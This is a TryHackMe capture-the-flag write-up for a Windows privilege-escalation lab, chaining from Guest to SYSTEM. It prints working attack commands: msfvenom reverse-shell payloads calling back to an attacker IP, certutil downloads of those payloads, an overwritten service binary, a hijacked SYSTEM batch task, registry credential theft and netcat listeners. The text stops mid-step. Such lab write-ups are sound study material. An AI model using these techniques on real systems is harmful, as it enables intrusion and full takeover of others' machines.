# TryHackMe: Windows Jump — Windows Privilege Escalation Write-up

**Date:** July 08, 2026  
**Category:** Windows Privilege Escalation / Enumeration  

## Overview

Starting with only the AttackBox and the target Windows machine's IP address, the goal of **Windows Jump** is to enumerate exposed services for initial access and chain privilege escalations across multiple local accounts (`Guest` → `thmuser` → `notadmin` → `svcadmin` → `NT AUTHORITY\SYSTEM`).

---

## Stage 1: Initial Access (`Guest` → `thmuser`)

### Enumeration
1. An `nmap` scan reveals open **SMB** (`port 445`) and **RDP** (`port 3389`) services.
2. List available SMB shares using null/guest authentication:
   ```bash
   smbclient -L //<TARGET_IP>/ -N
   ```
   This reveals an accessible share named `Public`.
3. Connect to the `Public` share and download `welcome.txt`:
   ```bash
   smbclient //<TARGET_IP>/Public -N
   get welcome.txt
   ```
4. Reading `welcome.txt` exposes default RDP credentials for `thmuser`:



* **Username:** `thmuser`
* **Password:** `Password1!`

### Exploitation
1. Connect to the target machine via RDP using **Remmina** with the discovered credentials.
2. Navigate to `C:\Users\thmuser\Desktop\flag1.txt` to retrieve the first flag.

---

## Stage 2: `thmuser` → `notadmin`

### Enumeration
Query the Windows Registry for stored Winlogon AutoAdminLogon credentials:
```cmd
reg query "HKLM\Software\Microsoft\Windows NT\CurrentVersion\Winlogon"
```
This reveals the plaintext password for `notadmin`.

### Exploitation
1. Spawn a command prompt running as `notadmin`:
   ```cmd
   runas /user:notadmin cmd.exe
   ```
2. Enter the discovered password when prompted, then read the second flag:
   ```cmd
   cd C:\Users\notadmin\Desktop
   type flag2.txt
   ```

---

## Stage 3: `notadmin` → `svcadmin`

### Enumeration
1. Search for services running under the `svcadmin` account:
   ```cmd
   wmic service get Name,DisplayName,StartName | findstr /i svcadmin
   ```
   This identifies the `THMsvc` service.
2. Inspect the service configuration and directory permissions:
   ```cmd
   sc qc THMsvc
   icacls C:\Windows\THMSvc
   ```
   The `C:\Windows\THMSvc` directory grants full/modify permissions to `Everyone`, allowing us to overwrite the service binary.

### Exploitation
1. Generate a 64-bit Windows reverse shell executable on the AttackBox:
   ```bash
   msfvenom -p windows/x64/shell_reverse_tcp LHOST=<YOUR_ATTACKER_IP> LPORT=4444 -f exe -o svc.exe
   ```
2. Host the payload from the AttackBox:
   ```bash
   python3 -m http.server 8000
   ```
3. Download and overwrite the service binary on the target machine:
   ```cmd
   certutil -urlcache -split -f http://<YOUR_ATTACKER_IP>:8000/svc.exe C:\Windows\THMSvc\svc.exe
   ```
4. Start a Netcat listener on the AttackBox:
   ```bash
   nc -lvnp 4444
   ```
5. Start the vulnerable service to trigger the reverse shell as `svcadmin`:
   ```cmd
   sc start THMSvc
   ```

---

## Stage 4: `svcadmin` → `NT AUTHORITY\SYSTEM`

### Enumeration
Checking scheduled tasks reveals `C:\Windows\Tasks\cleanup.bat`, which executes periodically with `SYSTEM` privileges. Inspecting its permissions shows that `svcadmin` has **Modify** rights over the batch file.

### Exploitation
1. Generate a second reverse shell payload on the AttackBox:
   ```bash
   msfvenom -p windows/x64/shell_reverse_tcp LHOST=<YOUR_ATTACKER_IP> LPORT=1337 -f exe -o shell.exe
   ```
2. Download `shell.exe` onto the target machine via `certutil`:
   ```cmd
   certutil -urlcache -split -f http://<YOUR_ATTACKER_IP>:8000/shell.exe C:\Windows\Tasks\shell.exe
   ```
3. Update `C:\Windows\Tasks\cleanup.bat` so it executes `shell.exe`:
   ```cmd
   echo C:\Windows\Tasks\shell.exe > C:\Windows\Tasks\cleanup.bat
   ```
4. Start a Netcat listener on port `1337`:
   ```bash
   nc -lvnp 1337
   ```
5. Wait for the scheduled task to trigger and catch the `NT AUTHORITY\SYSTEM` shell:

